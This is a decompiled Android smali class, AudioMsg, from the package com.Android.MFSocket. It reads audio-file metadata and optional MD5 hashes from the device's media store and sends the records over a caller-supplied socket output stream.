.class public Lcom/Android/MFSocket/AudioMsg;
.super Ljava/lang/Object;
.source "AudioMsg.java"


# instance fields
.field m_context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 13
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 14
    iput-object p1, p0, Lcom/Android/MFSocket/AudioMsg;->m_context:Landroid/content/Context;

    .line 15
    return-void
.end method


# virtual methods
.method getAudio(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 26
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "audioMsg"    # Ljava/lang/StringBuffer;
    .param p3, "nConfig"    # I

    .prologue
    .line 19
    const/4 v11, 0x0

    .line 22
    .local v11, "bNeedMD5":Z
    const/4 v12, 0x0

    .line 23
    .local v12, "bNeedThumbnail":Z
    packed-switch p3, :pswitch_data_0

    .line 43
    :goto_0
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/Android/MFSocket/AudioMsg;->m_context:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    .line 44
    .local v3, "contentResolver":Landroid/content/ContentResolver;
    sget-object v4, Landroid/provider/MediaStore$Audio$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    const-string v8, "title_key"

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 45
    .local v14, "cursor":Landroid/database/Cursor;
    invoke-interface {v14}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-nez v4, :cond_1

    .line 123
    :cond_0
    :goto_1
    return-void

    .line 25
    .end local v3    # "contentResolver":Landroid/content/ContentResolver;
    .end local v14    # "cursor":Landroid/database/Cursor;
    :pswitch_0
    const/4 v11, 0x0

    .line 26
    const/4 v12, 0x0

    .line 27
    goto :goto_0

    .line 29
    :pswitch_1
    const/4 v11, 0x1

    .line 30
    const/4 v12, 0x0

    .line 31
    goto :goto_0

    .line 33
    :pswitch_2
    const/4 v11, 0x0

    .line 34
    const/4 v12, 0x1

    .line 35
    goto :goto_0

    .line 37
    :pswitch_3
    const/4 v11, 0x1

    .line 38
    const/4 v12, 0x1

    goto :goto_0

    .line 50
    .restart local v3    # "contentResolver":Landroid/content/ContentResolver;
    .restart local v14    # "cursor":Landroid/database/Cursor;
    :cond_1
    const/16 v16, 0x0

    .line 51
    .local v16, "duration":I
    const-wide/16 v20, 0x0

    .line 53
    .local v20, "size":J
    const-string v25, ""

    .line 54
    .local v25, "url":Ljava/lang/String;
    const-string v9, ""

    .line 55
    .local v9, "album":Ljava/lang/String;
    const-string v10, ""

    .line 56
    .local v10, "artist":Ljava/lang/String;
    const-string v23, ""

    .line 57
    .local v23, "title":Ljava/lang/String;
    const-string v24, ""

    .line 58
    .local v24, "type":Ljava/lang/String;
    const-string v15, ""

    .line 59
    .local v15, "date":Ljava/lang/String;
    const-string v19, ""

    .line 61
    .local v19, "md5":Ljava/lang/String;
    invoke-interface {v14}, Landroid/database/Cursor;->getCount()I

    move-result v13

    .line 62
    .local v13, "counter":I
    if-lez v13, :cond_0

    .line 63
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    .line 64
    .local v22, "strCount":Ljava/lang/String;
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    invoke-static {v0, v1}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 70
    const/16 v18, 0x0

    .local v18, "j":I
    :goto_2
    move/from16 v0, v18

    if-lt v0, v13, :cond_2

    .line 120
    invoke-interface {v14}, Landroid/database/Cursor;->close()V

    .line 121
    invoke-virtual/range {p2 .. p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p1

    invoke-static {v0, v4}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 122
    const/4 v4, 0x0

    move-object/from16 v0, p2

    invoke-virtual {v0, v4}, Ljava/lang/StringBuffer;->setLength(I)V

    goto :goto_1

    .line 72
    :cond_2
    :try_start_0
    const-string v4, "title"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v23

    .line 73
    const-string v4, "album"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 74
    const-string v4, "artist"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    .line 75
    const-string v4, "_data"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v25

    .line 76
    const-string v4, "duration"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v16

    .line 77
    const-string v4, "_size"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v20

    .line 78
    const-string v4, "mime_type"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v24

    .line 79
    const-string v4, "date_modified"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v15

    .line 81
    if-eqz v11, :cond_3

    .line 82
    :try_start_1
    invoke-static/range {v25 .. v25}, Lcom/Android/MFSocket/MD5Msg;->fileMD5(Ljava/lang/String;)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v19

    .line 104
    :goto_3
    move-object/from16 v0, v23

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 105
    move-object/from16 v0, p2

    invoke-static {v9, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 106
    move-object/from16 v0, p2

    invoke-static {v10, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 107
    move-object/from16 v0, v25

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 108
    move/from16 v0, v16

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(ILjava/lang/StringBuffer;)V

    .line 109
    move-wide/from16 v0, v20

    move-object/from16 v2, p2

    invoke-static {v0, v1, v2}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(JLjava/lang/StringBuffer;)V

    .line 110
    move-object/from16 v0, v24

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 111
    move-object/from16 v0, p2

    invoke-static {v15, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 112
    move-object/from16 v0, v19

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 113
    invoke-static/range {p2 .. p2}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 115
    invoke-virtual/range {p2 .. p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p1

    invoke-static {v0, v4}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 116
    const/4 v4, 0x0

    move-object/from16 v0, p2

    invoke-virtual {v0, v4}, Ljava/lang/StringBuffer;->setLength(I)V

    .line 118
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    .line 70
    add-int/lit8 v18, v18, 0x1

    goto/16 :goto_2

    .line 85
    :cond_3
    :try_start_2
    const-string v19, ""
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_3

    .line 87
    :catch_0
    move-exception v17

    .line 88
    .local v17, "e":Ljava/lang/Exception;
    :try_start_3
    const-string v19, ""
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_3

    .line 90
    .end local v17    # "e":Ljava/lang/Exception;
    :catch_1
    move-exception v17

    .line 92
    .restart local v17    # "e":Ljava/lang/Exception;
    const/16 v16, 0x0

    .line 93
    const-wide/16 v20, 0x0

    .line 94
    const-string v25, ""

    .line 95
    const-string v9, ""

    .line 96
    const-string v10, ""

    .line 97
    const-string v23, ""

    .line 98
    const-string v24, ""

    .line 99
    const-string v15, ""

    .line 100
    const-string v19, ""

    .line 101
    invoke-virtual/range {v17 .. v17}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_3

    .line 23
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
    .end packed-switch
.end method
